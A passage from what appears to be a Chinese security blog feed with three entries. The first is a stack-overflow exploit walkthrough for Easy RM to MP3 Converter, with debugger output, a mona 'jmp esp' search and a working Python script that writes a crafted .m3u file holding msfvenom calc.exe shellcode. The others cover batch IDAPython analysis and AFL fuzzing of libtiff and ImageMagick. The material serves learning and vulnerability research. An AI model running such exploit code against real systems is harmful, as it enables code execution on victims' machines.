e8eddaffff      call    MSRMfilter03+<span class="number">0x6850</span> (<span class="number">10006850</span>)</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</div><div class="line">eax=<span class="number">06e71490</span> ebx=<span class="number">00164</span>a1c ecx=<span class="number">029005</span>a0 edx=<span class="number">00000000</span> esi=<span class="number">005</span>f31e4 edi=<span class="number">0015</span>f60c</div><div class="line">eip=<span class="number">10008</span>d63 esp=<span class="number">00156</span>cc4 ebp=<span class="number">005</span>f31c8 iopl=<span class="number">0</span>         nv up ei pl nz na pe nc</div><div class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00000206</span></div><div class="line">MSRMfilter03!Playlist_FindNextItem+<span class="number">0x23</span>:</div><div class="line"><span class="number">10008</span>d63 <span class="number">83</span>c418          add     esp,<span class="number">18</span>h</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc eax</div><div class="line"><span class="number">06e71490</span>  <span class="number">455</span>c3a44 <span class="number">6</span>f6c7078 <span class="number">565</span>c7469 <span class="number">70416</span>c75  D:\Exploit\VulAp</div><div class="line"><span class="number">06e714</span>a0  <span class="number">41415</span>c70 <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span>  p\AAAAAAAAAAAAAA</div><div class="line"><span class="number">06e714</span>b0  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span>  AAAAAAAAAAAAAAAA</div><div class="line"><span class="number">06e714</span>c0  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span>  AAAAAAAAAAAAAAAA</div><div class="line"><span class="number">06e714</span>d0  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span>  AAAAAAAAAAAAAAAA</div></pre></td></tr></table></figure></p>
<p>接着分析目的字符串 a1，a1 为 Playlist_FindNextItem() 函数调用时传入的参数，根据函数调用栈可回溯到其调用位置在 RM2MP3Converter.exe 模块的 sub_41E2B0 函数中，可以看到是一个函数指针调用，其传入的参数为栈中的地址 [esp+8928h+Str]。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">.text:<span class="number">0041E3</span>D8                 mov     ecx, <span class="number">880</span>h</div><div class="line">.text:<span class="number">0041E3</span>DD                 xor     eax, eax</div><div class="line">.text:<span class="number">0041E3</span>DF                 lea     edi, [esp+<span class="number">8928</span>h+var_2200]</div><div class="line">.text:<span class="number">0041E3</span>E6                 rep stosd</div><div class="line">.text:<span class="number">0041E3</span>E8 ; <span class="number">82</span>:   <span class="keyword">while</span> ( (*(<span class="keyword">int</span> (__cdecl **)(<span class="keyword">char</span> *))(v2 + <span class="number">25714</span>))(&amp;Str) )</div><div class="line">.text:<span class="number">0041E3</span>E8                 lea     ecx, [esp+<span class="number">8928</span>h+Str]</div><div class="line">.text:<span class="number">0041E3</span>EF                 push    ecx</div><div class="line">.text:<span class="number">0041E3</span>F0                 call    dword ptr [ebx+<span class="number">6472</span>h]   <span class="comment">// call MSRMfilter03!Playlist_FindNextItem()</span></div><div class="line">.text:<span class="number">0041E3</span>F6                 add     esp, <span class="number">4</span></div><div class="line">.text:<span class="number">0041E3</span>F9                 test    eax, eax</div><div class="line">.text:<span class="number">0041E3</span>FB                 jz      loc_41E9D2</div></pre></td></tr></table></figure></p>
<p>切换到伪代码界面，看到参数 Str 与 ebp 的偏移量为 0x6600 = 18(路径字符串长度) + 26094。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> v46; <span class="comment">// [esp+18h] [ebp-8910h]</span></div><div class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> v47; <span class="comment">// [esp+1Ch] [ebp-890Ch]</span></div><div class="line"> <span class="keyword">char</span> ArgList; <span class="comment">// [esp+20h] [ebp-8908h]</span></div><div class="line"> <span class="keyword">char</span> v49; <span class="comment">// [esp+2224h] [ebp-6704h]</span></div><div class="line"> <span class="keyword">char</span> Str; <span class="comment">// [esp+2328h] [ebp-6600h]</span></div><div class="line"> <span class="keyword">char</span> v51; <span class="comment">// [esp+232Bh] [ebp-65FDh]</span></div><div class="line"> <span class="keyword">char</span> v52[<span class="number">8704</span>]; <span class="comment">// [esp+4528h] [ebp-4400h]</span></div><div class="line"> <span class="keyword">char</span> v53; <span class="comment">// [esp+6728h] [ebp-2200h]</span></div></pre></td></tr></table></figure></p>
<p>至此，已分析完漏洞成因，程序中处理文件中读取的数据时，未对输入数据长度进行检查的情况下，使用 strcpy 将其复制到栈中，从而可能导致栈溢出漏洞。</p>
<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>在关闭 DEP 的情况下，可以把 shellcode 写入栈中，通过溢出覆盖返回地址为 <code>jmp esp</code> 指令的地址，跳转到栈中执行 shellcode。由于系统 DLL 加载时的内存基址相对固定，且在系统重启之前都不会改变，所以使用系统 DLL 中的跳板指令可较稳定地利用漏洞。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !py mona jmp -r esp -m kernel32</div><div class="line">Hold on...</div><div class="line">                             ...</div><div class="line">[+] Writing results to C:\mona_files\RM2MP3Converter_2572\jmp.txt</div><div class="line">    - Number of pointers of type <span class="string">'jmp esp'</span> : <span class="number">1</span> </div><div class="line">    - Number of pointers of type <span class="string">'call esp'</span> : <span class="number">2</span> </div><div class="line">[+] Results : </div><div class="line"><span class="number">0x75ee3165</span> |   <span class="number">0x75ee3165</span> (b+<span class="number">0x00093165</span>)  : jmp esp |  &#123;PAGE_EXECUTE_READ&#125; [kernel32.dll] ASLR: <span class="keyword">True</span>, Rebase: <span class="keyword">False</span>, SafeSEH: <span class="keyword">True</span>, OS: <span class="keyword">True</span>, v6<span class="number">.1</span><span class="number">.7601</span><span class="number">.17617</span> (C:\Windows\syswow64\kernel32.dll)</div><div class="line"><span class="number">0x75e80233</span> |   <span class="number">0x75e80233</span> (b+<span class="number">0x00030233</span>)  : call esp |  &#123;PAGE_EXECUTE_READ&#125; [kernel32.dll] ASLR: <span class="keyword">True</span>, Rebase: <span class="keyword">False</span>, SafeSEH: <span class="keyword">True</span>, OS: <span class="keyword">True</span>, v6<span class="number">.1</span><span class="number">.7601</span><span class="number">.17617</span> (C:\Windows\syswow64\kernel32.dll)</div><div class="line"><span class="number">0x75f02e2b</span> |   <span class="number">0x75f02e2b</span> (b+<span class="number">0x000b2e2b</span>)  : call esp |  &#123;PAGE_EXECUTE_READ&#125; [kernel32.dll] ASLR: <span class="keyword">True</span>, Rebase: <span class="keyword">False</span>, SafeSEH: <span class="keyword">True</span>, OS: <span class="keyword">True</span>, v6<span class="number">.1</span><span class="number">.7601</span><span class="number">.17617</span> (C:\Windows\syswow64\kernel32.dll)</div><div class="line">    Found a total of <span class="number">3</span> pointers</div></pre></td></tr></table></figure></p>
<p>这里使用结果中的第一项 0x75ee3165 进行利用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">offset = <span class="number">26094</span></div><div class="line">ret_addr = <span class="number">0x75ee3165</span>   <span class="comment"># address of "jmp esp"</span></div><div class="line"></div><div class="line"><span class="comment"># msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -b '\x00\x0a' -f python -v shellcode</span></div><div class="line">shellcode =  <span class="string">"\x90"</span>*<span class="number">30</span></div><div class="line">shellcode += <span class="string">"\xda\xc7\xd9\x74\x24\xf4\x5a\x2b\xc9\xbb\x29\xe7"</span></div><div class="line">shellcode += <span class="string">"\xb6\xd8\xb1\x31\x31\x5a\x18\x03\x5a\x18\x83\xc2"</span></div><div class="line">shellcode += <span class="string">"\x2d\x05\x43\x24\xc5\x4b\xac\xd5\x15\x2c\x24\x30"</span></div><div class="line">shellcode += <span class="string">"\x24\x6c\x52\x30\x16\x5c\x10\x14\x9a\x17\x74\x8d"</span></div><div class="line">shellcode += <span class="string">"\x29\x55\x51\xa2\x9a\xd0\x87\x8d\x1b\x48\xfb\x8c"</span></div><div class="line">shellcode += <span class="string">"\x9f\x93\x28\x6f\x9e\x5b\x3d\x6e\xe7\x86\xcc\x22"</span></div><div class="line">shellcode += <span class="string">"\xb0\xcd\x63\xd3\xb5\x98\xbf\x58\x85\x0d\xb8\xbd"</span></div><div class="line">shellcode += <span class="string">"\x5d\x2f\xe9\x13\xd6\x76\x29\x95\x3b\x03\x60\x8d"</span></div><div class="line">shellcode += <span class="string">"\x58\x2e\x3a\x26\xaa\xc4\xbd\xee\xe3\x25\x11\xcf"</span></div><div class="line">shellcode += <span class="string">"\xcc\xd7\x6b\x17\xea\x07\x1e\x61\x09\xb5\x19\xb6"</span></div><div class="line">shellcode += <span class="string">"\x70\x61\xaf\x2d\xd2\xe2\x17\x8a\xe3\x27\xc1\x59"</span></div><div class="line">shellcode += <span class="string">"\xef\x8c\x85\x06\xf3\x13\x49\x3d\x0f\x9f\x6c\x92"</span></div><div class="line">shellcode += <span class="string">"\x86\xdb\x4a\x36\xc3\xb8\xf3\x6f\xa9\x6f\x0b\x6f"</span></div><div class="line">shellcode += <span class="string">"\x12\xcf\xa9\xfb\xbe\x04\xc0\xa1\xd4\xdb\x56\xdc"</span></div><div class="line">shellcode += <span class="string">"\x9a\xdc\x68\xdf\x8a\xb4\x59\x54\x45\xc2\x65\xbf"</span></div><div class="line">shellcode += <span class="string">"\x22\x3c\x2c\xe2\x02\xd5\xe9\x76\x17\xb8\x09\xad"</span></div><div class="line">shellcode += <span class="string">"\x5b\xc5\x89\x44\x23\x32\x91\x2c\x26\x7e\x15\xdc"</span></div><div class="line">shellcode += <span class="string">"\x5a\xef\xf0\xe2\xc9\x10\xd1\x80\x8c\x82\xb9\x68"</span></div><div class="line">shellcode += <span class="string">"\x2b\x23\x5b\x75"</span></div><div class="line"></div><div class="line">payload = <span class="string">"A"</span>*offset + struct.pack(<span class="string">"&lt;I"</span>,ret_addr) + <span class="string">"B"</span>*<span class="number">4</span> + shellcode</div><div class="line"></div><div class="line">f = open(<span class="string">"crash.m3u"</span>,<span class="string">"w"</span>)</div><div class="line">f.write(payload)</div></pre></td></tr></table></figure></p>
<p>以上 exp 中有 2 点需要注意的。</p>
<ol>
<li><p>由于是跳转到栈顶 esp 中执行 shellcode，eip 与 esp 的位置是紧挨着的，shellcode 执行过程中如果需要修改栈中数据将有可能把 shellcode 指令部分修改，因此要在 shellcode 前面预留一段内存作为栈空间，这里填充了 30 个 0x90。</p>
</li>
<li><p>由于 sub_41E2B0 函数在返回时使用 <code>retn 4</code> 清栈。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.text:<span class="number">0041E9</span>D9                 mov     eax, <span class="number">1</span></div><div class="line">.text:<span class="number">0041E9</span>DE                 pop     esi</div><div class="line">.text:<span class="number">0041E9</span>DF                 pop     ebp</div><div class="line">.text:<span class="number">0041E9</span>E0 ; <span class="number">208</span>:   dword_47BEA8 = <span class="number">1</span>;</div><div class="line">.text:<span class="number">0041E9</span>E0                 mov     dword_47BEA8, eax</div><div class="line">.text:<span class="number">0041E9</span>E5                 pop     ebx</div><div class="line">.text:<span class="number">0041E9</span>E6                 add     esp, <span class="number">8918</span>h</div><div class="line">.text:<span class="number">0041E9</span>EC                 retn    <span class="number">4</span></div><div class="line">.text:<span class="number">0041E9</span>EC sub_41E2B0      endp</div></pre></td></tr></table></figure>
<p><code>retn 4</code> 具体操作如下，因此需要在 shellcode 前填充 4 个字节，才能通过 <code>jmp esp</code> 跳转到 shellcode 中执行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pop eip</div><div class="line">跳转到 eip</div><div class="line">add esp, <span class="number">4</span></div></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<p>References:<br>[1] <a href="https://r00tk1ts.github.io/2018/06/24/A%20Tale%20of%20Exploit%20Easy%20RM%202%20MP3%20Converter/" target="_blank" rel="external">A Tale of Exploit “Easy RM 2 MP3</a><br>[2] <a href="https://larry.ngrep.me/2018/08/04/learn-corelan-exploit-writing-part-one/" target="_blank" rel="external">Learn Corelan Exploit Writing Part 1</a></p>
]]></content>
      
        <categories>
            
            <category> Vulnerability Analysis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> stack overflow </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IDAPyhon 脚本批量分析程序]]></title>
      <url>/2018/0803/idapyhon-script-batch-analysis-program/</url>
      <content type="html"><![CDATA[<p>当我们需要对大量二进制文件进行分析时，使用 Python 将其自动化，可以极大的提高效率。</p>
<h1 id="0x01-运行-IDA"><a href="#0x01-运行-IDA" class="headerlink" title="0x01 运行 IDA"></a>0x01 运行 IDA</h1><p>IDA 可以使用命令行的方式启动，并且支持图形化接口和终端文本形式的接口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ida input-file        (Start graphical interface)</div><div class="line">idat input-file       (Start text interface)</div></pre></td></tr></table></figure></p>
<p>同时可使用以下参数：</p>
<blockquote>
<p>-A        autonomous mode. IDA will not display dialog boxes. Designed to be used together with -S switch.<br>-c         disassemble a new file (delete the old database)<br>-L###  name of the log file<br>-S###  Execute a script file when the database is opened.  </p>
</blockquote>
<p>使用以下命令可运行 IDA，自动加载二进制文件 input-file 进行分析，并运行 IDAPython 脚本 <code>analysis.py</code>。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ida -c -Lida.log -A -Sanalysis.py input-file</div></pre></td></tr></table></figure></p>
<p>需注意，日志文件名 <code>ida.log</code> 与 <code>-L</code> 之间，以及脚本文件名 <code>analysis.py</code> 与 <code>-S</code> 间都没有空格。</p>
<h1 id="0x02-批量处理"><a href="#0x02-批量处理" class="headerlink" title="0x02 批量处理"></a>0x02 批量处理</h1><p>首先，需要修改分析二进制程序的 IDAPython 脚本 <code>analysis.py</code>，使得该脚本文件在 IDA 分析完二进制程序后才被执行，同时在执行完后，关闭 IDA。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> idaapi</div><div class="line"><span class="keyword">import</span> idautils</div><div class="line"><span class="keyword">import</span> idc</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_some_analyse</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    idc.Wait()   <span class="comment"># 待 IDA 分析完程序后执行</span></div><div class="line">    do_some_analyse()</div><div class="line">    idc.Exit(<span class="number">0</span>)  <span class="comment"># 关闭 IDA</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<p>接着，通过以下脚本自动加载并调用 <code>analysis.py</code> 脚本分析 <code>pefile</code> 文件夹中的 PE 文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">!<span class="comment">#/usr/bin/env/ python</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"></div><div class="line">ida_path = <span class="string">"D:/Program Files/IDA 7.0/ida.exe"</span></div><div class="line">work_dir = os.path.abspath(<span class="string">'.'</span>)</div><div class="line">pefile_dir = os.path.join(work_dir, <span class="string">'pefile'</span>)</div><div class="line">script_path = os.path.join(work_dir, <span class="string">"analysis.py"</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(pefile_dir):</div><div class="line">    <span class="comment"># cmd_str = ida.exe -Lida.log -c -A -Sanalysis.py pefile</span></div><div class="line">    cmd_str = <span class="string">'&#123;&#125; -Lida.log -c -A -S&#123;&#125; &#123;&#125;'</span>.format(ida_path, script_path, os.path.join(pefile_dir, file))</div><div class="line">    print(cmd_str)</div><div class="line">    <span class="keyword">if</span> file.endswith(<span class="string">'dll'</span>) <span class="keyword">or</span> file.endswith(<span class="string">'exe'</span>):</div><div class="line">        p = subprocess.Popen((cmd_str))</div><div class="line">        p.wait()</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://www.hex-rays.com/products/ida/support/idadoc/417.shtml" target="_blank" rel="external">Command line switches</a><br>[2] <a href="https://researchcenter.paloaltonetworks.com/2016/06/unit42-using-idapython-to-make-your-life-easier-part-6/" target="_blank" rel="external">Using IDAPython to Make Your Life Easier: Part 6</a>   </p>
]]></content>
      
        <categories>
            
            <category> Program Analysis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IDAPython </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用 AFL 进行模糊测试]]></title>
      <url>/2018/0722/use-afl-for-fuzz-testing/</url>
      <content type="html"><![CDATA[<p><a href="http://0x4c43.cn/2018/0722/american-fuzzy-lop/">American Fuzzy Lop</a> 中介绍了 AFL 的原理和特性，下面将使用 AFL 对几个常用的应用程序进行模糊测试。</p>
<h1 id="0x01-AFL-安装与使用"><a href="#0x01-AFL-安装与使用" class="headerlink" title="0x01 AFL 安装与使用"></a>0x01 AFL 安装与使用</h1><p>首先下载 <a href="http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz" target="_blank" rel="external">AFL 源码</a> 进行安装。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ make</div><div class="line">$ make install</div></pre></td></tr></table></figure></p>
<p>若程序从 stdin 中获取输入，则 afl-fuzz 的使用方法如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./afl-fuzz -i testcase_dir -o findings_dir -- \</div><div class="line">     /path/to/tested/program [...program<span class="string">'s cmdline...]</span></div></pre></td></tr></table></figure></p>
<p>若程序从文件中获取输入，则在命令行部分输入 “@@” 字符作为占位符，afl-fuzz 会自动用输入文件名将其替换。</p>
<h1 id="0x02-模糊测试"><a href="#0x02-模糊测试" class="headerlink" title="0x02 模糊测试"></a>0x02 模糊测试</h1><h2 id="1-测试-libtiff"><a href="#1-测试-libtiff" class="headerlink" title="1. 测试 libtiff"></a>1. 测试 libtiff</h2><h3 id="1）安装-libtiff"><a href="#1）安装-libtiff" class="headerlink" title="1）安装 libtiff"></a>1）安装 libtiff</h3><p>下载 <a href="http://download.osgeo.org/libtiff/tiff-4.0.9.tar.gz" target="_blank" rel="external">libtiff 源码</a>，并使用 afl-gcc 编译。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CC=/usr/<span class="built_in">local</span>/bin/afl-gcc CXX=/usr/<span class="built_in">local</span>/bin/afl-g++ ./configure --disable-shared</div><div class="line">make clean</div><div class="line">make</div></pre></td></tr></table></figure></p>
<p>编译好后，可执行文件在 tools 文件夹中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">~/tiff-4.0.9/tools$ ls</div><div class="line">CMakeLists.txt  pal2rgb.o    tiff2pdf.c   tiffcp.o      tiffinfo.o</div><div class="line">fax2ps          ppm2tiff     tiff2pdf.o   tiffcrop      tiffmedian</div><div class="line">fax2ps.c        ppm2tiff.c   tiff2ps      tiffcrop.c    tiffmedian.c</div><div class="line">fax2ps.o        ppm2tiff.o   tiff2ps.c    tiffcrop.o    tiffmedian.o</div><div class="line">fax2tiff        raw2tiff     tiff2ps.o    tiffdither    tiffset</div><div class="line">fax2tiff.c      raw2tiff.c   tiff2rgba    tiffdither.c  tiffset.c</div><div class="line">fax2tiff.o      raw2tiff.o   tiff2rgba.c  tiffdither.o  tiffset.o</div><div class="line">Makefile        rgb2ycbcr.c  tiff2rgba.o  tiffdump      tiffsplit</div><div class="line">Makefile.am     thumbnail.c  tiffcmp      tiffdump.c    tiffsplit.c</div><div class="line">Makefile.in     tiff2bw      tiffcmp.c    tiffdump.o    tiffsplit.o</div><div class="line">Makefile.vc     tiff2bw.c    tiffcmp.o    tiffgt.c</div><div class="line">pal2rgb         tiff2bw.o    tiffcp       tiffinfo</div><div class="line">pal2rgb.c       tiff2pdf     tiffcp.c     tiffinfo.c</div></pre></td></tr></table></figure></p>
<h3 id="2）模糊测试"><a href="#2）模糊测试" class="headerlink" title="2）模糊测试"></a>2）模糊测试</h3><p>下面对 tools 文件夹中的 tiff2bw 进行模糊测试。首先新建 2 个文件夹用于存放输入和输出文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ mkdir tiff_input tiff_output</div></pre></td></tr></table></figure></p>
<p>从AFL 官网下载 <a href="http://lcamtuf.coredump.cx/afl/demo/" target="_blank" rel="external">测试样例</a> ，然后将 <code>afl_testcases\tiff\full\images</code> 目录下的文件复制到 tiff_input 中，最后运行 afl-fuzz 进行测试。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">afl-fuzz -i tiff_input -o tiff_output -- ./vultarget/tiff-4.0.9/tools/tiff2bw @@ /dev/null</div></pre></td></tr></table></figure></p>
<p>其中，-i 指定测试样本的路径；-o 指定输出结果的路径；/dev/null 使错误信息不输出到屏幕。  </p>
<p>afl-fuzz 跑了 12 个小时仍没有发现 crash。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-22/17526042.jpg" alt="">  </p>
<h2 id="2-测试-ImageMagick"><a href="#2-测试-ImageMagick" class="headerlink" title="2. 测试 ImageMagick"></a>2. 测试 ImageMagick</h2><h3 id="1）安装-ImageMagick"><a href="#1）安装-ImageMagick" class="headerlink" title="1）安装 ImageMagick"></a>1）安装 ImageMagick</h3><p>首先，使用以下命令下载、编译和安装 ImageMagick。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/ImageMagick/ImageMagick.git</div><div class="line"><span class="built_in">cd</span> ImageMagick</div><div class="line">CC=/usr/<span class="built_in">local</span>/bin/afl-clang CXX=/usr/<span class="built_in">local</span>/bin/afl-clang++ ./configure --disable-shared</div><div class="line">make</div></pre></td></tr></table></figure></p>
<h3 id="2）测试样例"><a href="#2）测试样例" class="headerlink" title="2）测试样例"></a>2）测试样例</h3><p><strong>测试样例获取</strong><br>高质量的测试样例可提高模糊测试的效率，可以使用 MozillaSecurity 提供的<a href="https://github.com/MozillaSecurity/fuzzdata" target="_blank" rel="external">开源测试样本</a>进行测试。</p>
<p>此外，还可以从 ImageMagick 的<a href="https://github.com/ImageMagick/ImageMagick/issues?utf8=%E2%9C%93&amp;q=cve" target="_blank" rel="external">漏洞提交 issue</a> 中找到大量的测试样例。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-22/76650703.jpg" alt="">  </p>
<p><strong>测试样例预处理</strong><br>在使用这些测试样例之前，先进行以下预处理可提高测试效率。</p>
<ul>
<li>生成不同格式的样例；</li>
<li>使用 afl-tmin 减小测试样例的大小；</li>
<li>使用 afl-cmin 减小测试样例的数量；</li>
</ul>
<p>通过以下脚本可完成预处理。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> shutil</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmin</span><span class="params">()</span>:</span></div><div class="line">    command = <span class="string">' -m 300 -t 5000 ./utilities/magick convert @@ /dev/null'</span> </div><div class="line">    os.system(<span class="string">'afl-cmin -i seeds/tmin -o seeds/cmin '</span> + command)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tmin</span><span class="params">()</span>:</span></div><div class="line">    command = <span class="string">' -m 300 -t 5000 ./utilities/magick convert @@ /dev/null'</span> </div><div class="line">    seed_list = os.listdir(<span class="string">'seeds/all_format'</span>)</div><div class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seed_list:</div><div class="line">        in_file = os.path.join(<span class="string">'seeds/all_format'</span>, seed)</div><div class="line">        out_file = os.path.join(<span class="string">'seeds/tmin'</span>, seed)</div><div class="line">        <span class="keyword">if</span> os.path.getsize(in_file) &gt; <span class="number">1024</span>*<span class="number">1</span>:</div><div class="line">            <span class="keyword">if</span> os.path.getsize(in_file) &lt; <span class="number">1024</span>*<span class="number">3</span> <span class="keyword">and</span> <span class="keyword">not</span> seed.endswith(<span class="string">'.txt'</span>):</div><div class="line">                os.system(<span class="string">'afl-tmin -i '</span> + in_file + <span class="string">' -o '</span> + out_file + command)</div><div class="line">                print(<span class="string">'afl-tmin -i '</span> + in_file + <span class="string">' -o '</span> + out_file + command)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">pass</span></div><div class="line">        <span class="keyword">elif</span> os.path.getsize(in_file) &gt; <span class="number">0</span>:</div><div class="line">            shutil.copyfile(in_file,out_file)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(origin_seeds)</span>:</span></div><div class="line">    seed_list = os.listdir(origin_seeds)</div><div class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seed_list:</div><div class="line">        seed_in = os.path.join(origin_seeds, seed)</div><div class="line">        file_name = (os.path.splitext(seed)[<span class="number">0</span>])</div><div class="line">        coder_list = os.listdir(<span class="string">'coders'</span>)</div><div class="line"></div><div class="line">        <span class="keyword">for</span> cfile <span class="keyword">in</span> coder_list:</div><div class="line">            <span class="keyword">if</span> cfile.endswith(<span class="string">'.c'</span>):</div><div class="line">                extern = cfile[:cfile.find(<span class="string">'.c'</span>)]</div><div class="line">                seed_out = <span class="string">'seeds/all_format/'</span> + file_name + <span class="string">'.'</span> + extern</div><div class="line">                os.system(<span 